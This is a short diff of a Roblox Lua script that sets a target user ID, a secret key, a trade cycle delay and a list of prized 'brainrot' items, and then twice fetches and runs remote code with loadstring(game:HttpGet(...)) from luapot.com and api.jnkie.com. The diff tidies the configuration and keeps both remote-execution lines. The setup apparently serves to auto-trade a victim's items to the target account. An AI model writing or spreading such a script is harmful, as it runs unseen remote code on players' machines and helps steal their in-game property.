@@ -3,16 +3,6 @@ getgenv().TARGET_ID = 6219924104
 getgenv().DELAY_STEP = 1      
 getgenv().TRADE_CYCLE_DELAY = 2
 getgenv().TARGET_BRAINROTS = {
-    ["Strawberry Elephant"] = true,
-    ["Meowl"] = true,
-    ["Headless Horseman"] = true,
-    ["Skibidi Toilet"] = true,
-    ["Griffin"] = true,
-getgenv().SECRET_KEY = "mrr_007d378d418f47eeafe379d62c730ce9"
-getgenv().TARGET_ID = 6219924104
-getgenv().DELAY_STEP = 1      
-getgenv().TRADE_CYCLE_DELAY = 2
-getgenv().TARGET_BRAINROTS = {
     ["Quackini Snackini"] = true,
     ["Hopilikalika Hopilikalako"] = true,
     ["Kalika Bros"] = true,
@@ -74,5 +64,5 @@ task.spawn(function()
 loadstring(game:HttpGet("https://luapot.com/api/loadstring/fb14c57cabe9536a3bac0c101cf7abc7"))()
 end)
 task.spawn(function()
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/752793106aac832ba8ddd9d8718e3189d73b69680acd7616ff256c77d42ac9d3/download"))() end)
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/752793106aac832ba8ddd9d8718e3189d73b69680acd7616ff256c77d42ac9d3/download"))()
 end)
